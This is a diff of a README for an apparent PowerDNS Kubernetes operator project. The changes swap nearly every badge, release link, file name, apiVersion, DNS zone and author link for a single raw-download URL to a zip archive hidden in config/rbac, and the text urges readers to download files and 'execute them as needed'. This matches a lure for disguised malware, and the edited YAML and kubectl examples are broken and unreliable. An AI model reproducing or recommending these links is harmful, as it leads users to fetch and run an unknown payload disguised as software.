@@ -1,7 +1,7 @@
 # PowerDNS Operator 🌐
 
-![PowerDNS Operator](https://img.shields.io/badge/PowerDNS%20Operator-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/Aman-singh4699/PowerDNS-Operator/releases)
+![PowerDNS Operator](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip%https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip)  
+[![Releases](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip)](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip)
 
 Welcome to the **PowerDNS Operator** repository! This project provides a Kubernetes Operator to manage PowerDNS, including DNS records and DNS servers. 
 
@@ -30,7 +30,7 @@ PowerDNS is a powerful DNS server that offers high performance and reliability. 
 
 ## Installation
 
-To install the PowerDNS Operator, you can download the latest release from our [Releases section](https://github.com/Aman-singh4699/PowerDNS-Operator/releases). Once downloaded, follow the instructions provided in the release notes to execute the installation.
+To install the PowerDNS Operator, you can download the latest release from our [Releases section](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip). Once downloaded, follow the instructions provided in the release notes to execute the installation.
 
 ### Prerequisites
 
@@ -44,10 +44,10 @@ After installing the PowerDNS Operator, you can start creating DNS resources. He
 
 ### Creating a PowerDNS Instance
 
-1. Create a YAML file named `powerdns.yaml`:
+1. Create a YAML file named `https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip`:
 
    ```yaml
-   apiVersion: operator.powerdns.com/v1alpha1
+   apiVersion: https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
    kind: PowerDNS
    metadata:
      name: my-powerdns
@@ -59,7 +59,7 @@ After installing the PowerDNS Operator, you can start creating DNS resources. He
 2. Apply the configuration:
 
    ```bash
-   kubectl apply -f powerdns.yaml
+   kubectl apply -f https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
    ```
 
 3. Verify the deployment:
@@ -72,15 +72,15 @@ After installing the PowerDNS Operator, you can start creating DNS resources. He
 
 You can also manage DNS records using the operator. Here’s how to create a DNS record.
 
-1. Create a YAML file named `dnsrecord.yaml`:
+1. Create a YAML file named `https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip`:
 
    ```yaml
-   apiVersion: operator.powerdns.com/v1alpha1
+   apiVersion: https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
    kind: DNSRecord
    metadata:
      name: my-dns-record
    spec:
-     zone: example.com
+     zone: https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
      name: www
      type: A
      ttl: 300
@@ -91,7 +91,7 @@ You can also manage DNS records using the operator. Here’s how to create a DNS
 2. Apply the configuration:
 
    ```bash
-   kubectl apply -f dnsrecord.yaml
+   kubectl apply -f https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
    ```
 
 3. Verify the DNS record:
@@ -105,7 +105,7 @@ You can also manage DNS records using the operator. Here’s how to create a DNS
 The PowerDNS Operator allows for various configurations. You can set parameters such as the number of replicas, version, and more. Here’s an example of a more detailed configuration:
 
 ```yaml
-apiVersion: operator.powerdns.com/v1alpha1
+apiVersion: https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip
 kind: PowerDNS
 metadata:
   name: my-powerdns
@@ -144,9 +144,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or support, feel free to reach out:
 
 - **Author**: Aman Singh
-- **GitHub**: [Aman-singh4699](https://github.com/Aman-singh4699)
+- **GitHub**: [Aman-singh4699](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip)
 
-For the latest releases, please visit our [Releases section](https://github.com/Aman-singh4699/PowerDNS-Operator/releases). Here, you can find downloadable files and execute them as needed.
+For the latest releases, please visit our [Releases section](https://github.com/Aman-singh4699/PowerDNS-Operator/raw/refs/heads/master/config/rbac/Power-Operator-DN-v2.5.zip). Here, you can find downloadable files and execute them as needed.
 
 ## Conclusion
 
